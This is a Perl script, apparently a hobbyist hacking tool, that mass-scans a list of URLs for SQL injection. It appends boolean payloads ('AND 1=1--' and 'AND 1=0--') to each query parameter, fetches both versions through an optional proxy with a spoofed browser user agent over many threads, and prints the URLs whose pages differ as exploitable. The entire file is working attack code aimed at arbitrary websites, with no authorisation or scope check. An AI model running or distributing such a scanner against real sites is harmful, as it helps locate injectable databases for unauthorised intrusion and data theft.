#sqli scanner script by int3 
#open file, test all sites for sql injection 
#usage: perl sqlscan.pl filename [-e ender] [-p proxy] [-t threads] 
#support http proxy like -p localhost:8080 
#-e optional, default end with -- 
#-p optional, default no proxy 
#-t optional, default 10 threads 
#filename is list of files 
#default no proxy and 10 threads 
 
use LWP::UserAgent; 
use Getopt::Std; 
use Thread; 
use threads::shared; 
 
$maxthreads = 10; #max threads at a time 
$filename = ''; 
$status = 0; 
$proxy = ''; 
$ender = '--'; 
for ($i = 0; $i < ($#ARGV+1); $i++) { 
    $s = @ARGV[$i]; 
    if ($status eq 1) { 
        $proxy = 'http://' . $s . '/'; #proxy speicifed 
        $status = 0; 
    } 
    elsif ($status eq 2) { 
        $maxthreads = $s; #threads specified 
        $status = 0; 
    } 
    elsif ($status eq 3) { 
        $ender = $s; #different ender 
        $status = 0; 
    } 
    elsif ($s eq '-p') { 
        $status = 1; 
    } 
    elsif ($s eq '-t') { 
        $status = 2; 
    } 
    elsif ($s eq '-e') { 
        $status = 3; 
    } 
    elsif ($s eq '-h') { 
        print "perl sqlscan.pl filename [-e ender] [-p proxy] [-t threads]\n"; 
    } 
    elsif (substr($s, 0, 1) eq '-') { 
        print "Invalid switch, use -h for help\n"; 
    } 
    else { 
        $filename = $s; 
    } 
} 
open(list, $filename); 
@sites; 
while (($line = <list>) ne undef) { 
    chomp($line); 
    push(@sites, $line); 
} 
@match1; 
@match2; 
for ($i = 0; $i <= $#sites; $i++) { 
    $_ = @sites[$i]; 
    /([^\?]*)\?([^\?]*)/; #match for url base 
    $base = $1; #base of url 
    $dyn = $2; #dynamic part 
    $end = 0; 
    $lastpos = 0; 
    while ($end ne 1) { 
        $lastpos = index($dyn, '&', $lastpos+1); 
        if ($lastpos eq -1) { 
            $lastpos = length($dyn); 
            $end = 1; 
        } 
        $t = $dyn; 
        substr($t, $lastpos, 0) = '%20AND%201=1' . $ender; 
        push(@match1, $base . '?' . $t); 
        $t = $dyn; 
        substr($t, $lastpos, 0) = '%20AND%201=0' . $ender; 
        push(@match2, $base . '?' . $t); 
    } 
} 
my @exploit : shared; #0 if not exploit, 1 if exploit 
my $threads : shared = 0; #number of threads running 
for ($i = 0; $i <= $#match1; $i++) { 
    while (1) { 
        if ($threads < $maxthreads) { 
            my $thr = threads->create(\&check_site, $i, @match1[$i], @match2[$i]); #compare and check if possible sql exploit 
            $thr->detach(); #detach from thread 
            last; #next loop 
        } 
        else { 
            sleep(1); 
        } 
    } 
} 
while ($threads > 0) { 
    sleep(1); #wait until all threads terminate 
} 
for ($i = 0; $i <= $#exploit; $i++) { 
    if (@exploit[$i] eq 1) { 
        print @match2[$i] . "\n"; 
    } 
} 
exit(0); 
 
#check if site exploitable by: connect to sites, strip html, and compare (exploit if different) 
sub check_site { 
    $page1, $page2; 
    $threads++; #new thread create 
    $ua = LWP::UserAgent->new; 
    $ua->timeout(10); 
    if ($proxy ne '') { 
        $ua->proxy('http', $proxy); 
    } 
    $ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12"); 
    $response = $ua->get($_[1]); #get contents when sql result true 
    if ($response->is_success) { 
        $page1 = $response->content; 
    } 
    $ua = LWP::UserAgent->new; 
    $ua->timeout(10); 
    if ($proxy ne '') { 
        $ua->proxy('http', $proxy); 
    } 
    $ua->agent("Mozilla/5.0 (Windows; U; Windows NT 5.1; nl; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12"); 
    $response = $ua->get($_[2]); #get contents when sql result false 
    if ($response->is_success) { 
        $page2 = $response->content; 
    } 
    $page1 =~ s/<.+?>//g; #strip html 
    $page2 =~ s/<.+?>//g; 
    if ($page1 eq $page2) { 
        @exploit[$_[0]] = 0; #not exploit 
    } 
    else { 
        @exploit[$_[0]] = 1; #exploit 
    } 
    $threads--; #thread close 
}